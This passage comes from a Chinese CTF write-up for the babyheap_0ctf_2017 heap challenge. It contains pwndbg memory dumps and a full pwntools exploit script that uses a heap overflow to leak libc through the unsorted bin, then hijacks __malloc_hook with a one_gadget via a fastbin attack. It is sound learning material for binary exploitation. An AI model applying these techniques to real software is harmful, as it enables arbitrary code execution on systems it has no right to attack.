class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555757000</span>     <span class="hljs-number">0x555555778000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：</p><p>这里我重新调试了一个gdb</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xb422b6be0c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be0d0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000014</span><br>    #chunk_flag<span class="hljs-meta">#size</span><br><span class="hljs-number">0xb422b6be0e0</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk_data_ptr<br><span class="hljs-number">0xb422b6be0f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be100</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be130</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp 讲解"></a>exp 讲解</h2><p>exp的主要内容如下：</p><blockquote><p>exp来自@yichen师傅：<a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br>elf = ELF(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br><br><span class="hljs-comment">#首先是定义的一些函数，对应着程序的功能</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-comment">#首先申请4个fast chunk和1个small chunk</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br><br><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4</span><br><span class="hljs-comment">#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80</span><br><span class="hljs-comment">#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br><br><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br><span class="hljs-comment">#为了让index4能够被放到unsortedbins中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#再申请一个防止index4与top chunk合并了</span><br>alloc(<span class="hljs-number">0x80</span>)<br><br><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(文末有工具算)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#此时因为fastbins中没有了,所以从unsortedbins中找</span><br>alloc(<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#index2还是指向index4那个地方我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br><br><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index6</span><br><br><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-comment">#再申请一下触发one_gadget</span><br>alloc(<span class="hljs-number">255</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：</p><ul><li>利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）</li><li>利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。</li></ul><h3 id="1-leak-libc-addr"><a href="#1-leak-libc-addr" class="headerlink" title="1. leak libc_addr"></a>1. leak libc_addr</h3><h4 id="1-1-模仿程序功能"><a href="#1-1-模仿程序功能" class="headerlink" title="1-1 模仿程序功能"></a>1-1 模仿程序功能</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br></code></pre></td></tr></tbody></table></figure><p>这4个函数分别对应程序的四个主要功能，这里就不多说了。</p><h4 id="1-2-申请-5个chunk"><a href="#1-2-申请-5个chunk" class="headerlink" title="1-2 申请 5个chunk"></a>1-2 申请 5个chunk</h4><p>由于我们希望使用 unsorted bin 来泄漏 libc 基地址，<strong>所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。</strong>具体设计如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br></code></pre></td></tr></tbody></table></figure><p>执行完此payload之后的heap情况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">50</span>gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index0<br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index1<br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index2<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index3<br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> #index4<br>......（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> #top_chunk<br></code></pre></td></tr></tbody></table></figure><p>此时程序结构体中的情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98720</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    #index1<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757030</span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     #index2<br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757050</span><span class="hljs-number">0x0000000000000001</span><br>    #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-3-free创建的index1和index2"><a href="#1-3-free创建的index1和index2" class="headerlink" title="1-3 free创建的index1和index2"></a>1-3 free创建的index1和index2</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><p>执行此部分payload，来看一下堆状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#fd指针指向index1的起始地址</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>此时的bin和main_arena情况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0000555555757020</span>-&gt;<span class="hljs-number">0x555555757040</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757040</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757110</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span 